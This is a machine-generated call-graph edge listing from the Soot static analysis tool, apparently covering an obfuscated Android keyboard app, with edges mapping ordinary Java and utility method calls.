VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Float: java.lang.Float valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <lkh: java.lang.Object[] toArray()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Set: java.util.Iterator iterator()>() in <ljf: java.util.Iterator iterator()> ==> <java.util.HashSet: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(java.util.List)> ==> <java.util.AbstractMap: void <init>()>
SPECIAL edge: specialinvoke r1.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Local", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(93) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r0) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean isEmpty()>() in <lqs: boolean equals(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r0 = virtualinvoke $r4.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Double: boolean isNaN(double)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gwk: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hno: void <init>()> ==> <iec: void <init>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lkq: lsb C(int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int j()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsb: boolean hasNext()>() in <lsb: java.lang.Object next()> ==> <lsb: boolean hasNext()>
STATIC edge: $r4 = staticinvoke <java.lang.Integer: java.lang.String toHexString(int)>($i2) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Integer: java.lang.String toHexString(int)>
STATIC edge: $r3 = staticinvoke <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>("GMT") in <ose: void <clinit>()> ==> <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lwe: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwe: void <clinit>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkg: void c(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Class getClass()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lvr: int hashCode()>() in <lvt: int hashCode()> ==> <lvr: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmc: void <init>(lme)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lji: void <init>(java.util.Comparator)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsn: void <init>(java.util.logging.Level)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[0-9]+") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lsw d()>() in <lsn: lsw i(lsq)> ==> <lsf: lsw d()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
SPECIAL edge: specialinvoke $r0.<lqs: void <init>(lkq,java.util.Comparator)>($r2, $r1) in <lqs: void <clinit>()> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(17) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lwa: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwa: void <clinit>()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqs: int size()>
SPECIAL edge: specialinvoke $r4.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.w: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r6 = staticinvoke <ivw: java.lang.String l(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: java.lang.String l(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object[],int)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<lki: void <init>(java.lang.Object,java.lang.Object)>($r0, $r1) in <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)> ==> <lki: void <init>(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lnc: void <init>(java.lang.Object)> ==> <lsa: void <init>()>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r14.<lvt: boolean a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: boolean a()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean containsAll(java.util.Collection)>($r4) in <lqs: boolean equals(java.lang.Object)> ==> <lqs: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
CLINIT edge: staticinvoke <java.util.concurrent.TimeUnit: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.concurrent.TimeUnit: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(11) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int rotateLeft(int,int)>($i0, 15) in <izw: int ac(int)> ==> <java.lang.Integer: int rotateLeft(int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String toString()>
STATIC edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void c()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: void c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsu: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r2.<lji: void <init>(java.util.Comparator)>($r0) in <lqd: lqd b(java.util.Comparator)> ==> <lji: void <init>(java.util.Comparator)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $l4 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long get()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long get()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmp: void <init>()> ==> <lma: void <init>()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStickerSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i1 = staticinvoke <java.lang.Math: int max(int,int)>($i1, 2) in <lma: int e(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lkq: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r1) in <iye: void Q(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsa: void <init>()> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: java.util.Iterator iterator()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int size()>() in <liy: int size()> ==> <ljd: int size()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] x()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>($r2, $r1, $i0, r0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractCollection: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lvt: void <init>(lvr)>($r3) in <lvt: void <clinit>()> ==> <lvt: void <init>(lvr)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r6.<lly: void j(java.lang.Object)>($r8) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: void j(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i1 = interfaceinvoke $r2.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lrg: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r9 = virtualinvoke $r9.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(64) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean isEmpty()>() in <ljf: int c()> ==> <ljf: boolean isEmpty()>
SPECIAL edge: specialinvoke $r1.<lkm: void <init>(lkq,int)>(r0, $i0) in <lkq: lsb C(int)> ==> <lkm: void <init>(lkq,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r4.<ltc: void <init>(java.lang.String,int,int)>("FULL", 3, $i0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: staticinvoke <iye: void D(boolean,java.lang.String,int,int)>(1, "min (%s) must be less than or equal to max (%s)", $i0, $i1) in <kwe: int U(int,int,int)> ==> <iye: void D(boolean,java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lkq: void <init>()> ==> <lkh: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.util.Iterator l()> ==> <ljd: java.util.Map o()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=null") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>($z0, "collection too large") in <lma: int e(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r2.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.Object cast(java.lang.Object)>($r2) in <lsz: java.lang.Object d(java.lang.Object)> ==> <java.lang.Class: java.lang.Object cast(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<hcb: java.lang.Object l(java.lang.String,ldp)>($r2, $r4) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: java.lang.Object l(java.lang.String,ldp)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(short[],short)>($r7, $s8) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(short[],short)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>("Both parameters are null") in <iye: java.lang.Object V(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <lkt: void e(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
